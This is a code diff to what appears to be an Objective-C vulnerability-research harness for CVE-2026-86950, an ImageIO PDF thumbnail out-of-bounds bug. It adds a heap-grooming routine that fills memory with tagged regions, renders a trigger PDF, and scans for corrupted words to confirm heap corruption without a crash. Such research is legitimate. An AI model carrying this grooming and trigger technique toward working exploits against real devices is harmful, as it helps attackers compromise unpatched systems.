@@ -58,6 +58,49 @@ static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
     return res;
 }
 
+// newjail's detection method for a heap OOB that does not fault: pre-map large
+// regions with a marker, trigger, then scan for CHANGED words.  If the OOB write
+// lands inside one of our regions, the marker changes — that is a proof of
+// attacker-controlled corruption, usable even when the process survives.
+static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
+    const uint64_t MARK = 0xA5A5A5A5A5A5A5A5ULL;
+    NSMutableArray *ptrs = [NSMutableArray array];
+    for (int i = 0; i < regions; i++) {
+        void *p = malloc(each);
+        if (!p) break;
+        memset(p, 0xA5, each);
+        // a recognisable per-region tag in the first slots
+        ((uint64_t *)p)[0] = MARK ^ (uint64_t)i;
+        ((uint64_t *)p)[1] = MARK;
+        [ptrs addObject:[NSValue valueWithPointer:p]];
+    }
+    int n = (int)ptrs.count;
+    AvePost([NSString stringWithFormat:@"86950 groom: %d regions x %zu KB (~%zu MB) tagged",
+             n, each / 1024, (n * each) >> 20]);
+
+    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-G%d", n], maxPx);
+    AvePost([NSString stringWithFormat:@"86950 groom-render: %@", r]);
+
+    int corrupt = 0;
+    for (int i = 0; i < n; i++) {
+        void *p = [ptrs[i] pointerValue];
+        uint64_t *q = (uint64_t *)p;
+        for (size_t off = 0; off + 8 <= each; off += 8) {
+            if (q[0] == (MARK ^ (uint64_t)i) && off == 0) continue;   // our own tag
+            if (q[off / 8] != 0xA5A5A5A5A5A5A5A5ULL) {
+                AvePost([NSString stringWithFormat:@"86950 CORRUPTION region %d @+%#zx "
+                         @"= %#llx (no crash)", i, off, q[off / 8]]);
+                corrupt++;
+                if (corrupt > 8) break;
+            }
+        }
+        free(p);
+        if (corrupt > 8) break;
+    }
+    AvePost([NSString stringWithFormat:@"86950 groom scan: %d corrupted words", corrupt]);
+    return corrupt;
+}
+
 NSString *ModCVE86950(void) {
     AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
     AvePost(@"86950 start");
@@ -82,5 +125,16 @@ NSString *ModCVE86950(void) {
     }
 
     AvePost(@"86950 done: the thumbnail path survived at every raster size");
-    return @"86950: thumbnail path survived at every raster size (no OOB fault)";
+    // pure-crash sweep is done; now the corruption oracle: with the heap
+    // pre-filled with tagged regions, a write that lands inside them changes the
+    // tag even if the process survives.
+    int corrupt = ModGroomScan(64, 8 << 20, @"trigger_86950.pdf", 32);
+    if (corrupt) {
+        AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED (no crash needed)");
+        return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words in "
+                @"our tagged regions)", corrupt];
+    }
+    AvePost(@"86950 verdict: no corruption seen in the tagged regions this run");
+    return @"86950: crash oracle fired; groom scan found no changed words (groom density "
+            @"or distance is next)";
 }
